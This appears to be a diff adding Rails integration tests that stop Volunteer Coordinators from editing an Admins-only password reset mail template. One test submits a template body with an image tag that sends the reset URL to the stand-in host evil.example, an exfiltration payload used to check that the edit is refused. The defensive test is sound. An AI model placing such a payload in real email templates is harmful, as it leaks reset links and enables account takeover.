@@ -153,6 +153,40 @@ class Communication::MailTemplatesControllerTest < ActionDispatch::IntegrationTe
     assert_equal "password_reset_mailer/notify", @template.reload.tag
   end
 
+  # Review finding: anyone who can edit a message could send what it carries out
+  # with every email, say in an image's address, so these are the Admins' to edit.
+  test "a Volunteer Coordinator cannot open or save a message whose email carries what the log keeps out" do
+    original = @template.body
+    sign_in_as(@vc)
+
+    get edit_communication_mail_template_path(@template)
+    assert_redirected_to communication_mail_templates_path
+
+    patch communication_mail_template_path(@template),
+          params: { mail_template: { subject: @template.subject,
+                                     body: %(<img src="https://evil.example/?t={{ reset_url | url_encode }}">),
+                                     text_body: @template.text_body } }
+    assert_redirected_to communication_mail_templates_path
+    assert_equal original, @template.reload.body
+  end
+
+  test "a Volunteer Coordinator may still edit any other message" do
+    sign_in_as(@vc)
+
+    get edit_communication_mail_template_path(@piece)
+
+    assert_response :success
+  end
+
+  test "the list gives a Volunteer Coordinator no edit link for an Admins-only message" do
+    sign_in_as(@vc)
+
+    get communication_mail_templates_path
+
+    assert_select "a[href=?]", edit_communication_mail_template_path(@template), count: 0
+    assert_select "a[href=?]", edit_communication_mail_template_path(@piece), count: 1
+  end
+
   test "anyone else cannot save" do
     original = @template.subject
     sign_in_as(@outsider)
